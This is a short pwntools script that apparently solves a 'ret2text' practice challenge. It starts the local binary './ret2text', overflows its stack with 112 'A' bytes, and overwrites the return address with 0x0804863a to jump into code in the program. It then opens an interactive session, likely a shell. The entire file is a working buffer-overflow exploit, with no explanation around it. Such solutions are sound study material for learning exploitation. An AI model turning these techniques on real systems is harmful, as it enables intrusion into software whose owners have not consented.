from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
s = process("./ret2text") 
# gdb.attach(s,'b *0x080486b3\nc')
payload = "A"*112 + p32(0x0804863a)
s.sendline(payload)
s.interactive()
